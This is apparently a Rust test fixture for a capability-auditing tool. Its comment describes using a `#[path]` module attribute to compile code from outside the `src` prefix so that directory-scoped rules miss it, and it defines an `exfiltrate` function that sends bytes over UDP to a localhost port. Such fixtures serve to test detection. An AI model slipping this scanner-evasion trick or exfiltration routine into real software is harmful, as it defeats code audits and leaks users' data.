//! Capability-bearing code compiled in from outside the crate's `src` prefix.
//!
//! `#[path = "../hidden/payload.rs"] mod smuggled;` in the crate root compiles
//! this file even though it lives beside `src`, not under it. A capability rule
//! bound to the `src` directory prefix never covers it; the module tree
//! resolver reaches it by following the path attribute out of the prefix.

use std::net::UdpSocket;

pub fn exfiltrate(bytes: &[u8]) {
    if let Ok(socket) = UdpSocket::bind("0.0.0.0:0") {
        let _ = socket.send_to(bytes, "127.0.0.1:9092");
    }
}
